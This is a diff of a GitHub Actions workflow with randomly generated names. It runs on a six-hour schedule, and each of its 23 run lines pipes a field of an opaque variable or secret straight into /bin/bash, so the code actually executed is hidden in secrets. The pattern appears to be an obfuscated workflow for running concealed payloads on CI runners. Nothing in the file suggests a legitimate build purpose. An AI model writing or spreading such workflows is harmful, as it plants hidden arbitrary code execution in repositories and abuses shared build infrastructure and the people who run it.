@@ -1,29 +1,38 @@
 name: purmabiaomk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 2/6 * * *'
-
-jobs:  # 26142
+    - cron: '44 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: purmabiaomk
         env:
-          nu8: ${{ secrets.nu8 }}
+          omood28429: ${{ secrets.omood28429 }}
         run: |
-          echo $nu8 | jq -r .c890 | /bin/bash
-          echo $jmi783 | jq -r .aj15 | /bin/bash
-          echo $vxh1 | jq -r .seesb14499 | /bin/bash
-          echo $yvy7499 | jq -r .zpej1 | /bin/bash
-          echo $ltrau5 | jq -r .sztdz186 | /bin/bash
-          echo $niflj7 | jq -r .ir20831 | /bin/bash
-          echo $ab2975 | jq -r .fu15 | /bin/bash
-          echo $cccuk19 | jq -r .n5830 | /bin/bash
-          echo $tb8 | jq -r .krdji7409 | /bin/bash
-          echo $as98581 | jq -r .ic14 | /bin/bash
-          echo $w64 | jq -r .j3 | /bin/bash
-          echo $vqjir258 | jq -r .rt36 | /bin/bash
+          echo $omood28429 | jq -r .hbm74 | /bin/bash
+          echo $yfu76 | jq -r .dvzrb399 | /bin/bash
+          echo $uo13637 | jq -r .fv12 | /bin/bash
+          echo $ggr654 | jq -r .v396 | /bin/bash
+          echo $rgjos72 | jq -r .fqazx5715 | /bin/bash
+          echo $ke60 | jq -r .m74259 | /bin/bash
+          echo $svo3758 | jq -r .b54 | /bin/bash
+          echo $hl5 | jq -r .tp3139 | /bin/bash
+          echo $vd6158 | jq -r .fcwq51 | /bin/bash
+          echo $xtwq11064 | jq -r .aqoj117 | /bin/bash
+          echo $rt5673 | jq -r .ngmom9526 | /bin/bash
+          echo $tl108 | jq -r .hq4787 | /bin/bash
+          echo $clof503 | jq -r .lto14 | /bin/bash
+          echo $vokm19 | jq -r .j2177 | /bin/bash
+          echo $ufpnk2662 | jq -r .tm73786 | /bin/bash
+          echo $nmj211 | jq -r .rcovf22 | /bin/bash
+          echo $bmpnu8 | jq -r .q158 | /bin/bash
+          echo $p831 | jq -r .ud4 | /bin/bash
+          echo $fchlr070 | jq -r .t58669 | /bin/bash
+          echo $em201 | jq -r .fwab378 | /bin/bash
+          echo $bp27999 | jq -r .voxx414 | /bin/bash
+          echo $ndg0214 | jq -r .ju9 | /bin/bash
+          echo $tamo7409 | jq -r .u0 | /bin/bash
 
